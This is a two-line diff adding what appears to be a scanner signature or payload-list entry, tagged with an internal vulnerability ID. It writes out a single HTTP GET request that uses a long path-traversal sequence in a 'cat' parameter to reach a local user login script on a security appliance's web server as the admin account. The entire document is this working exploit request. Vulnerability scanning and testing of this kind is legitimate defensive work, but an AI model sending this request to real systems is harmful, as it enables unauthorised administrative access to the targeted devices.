@@ -1,0 +1,2 @@
+# Vulnerable: ITS-1590
+GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin
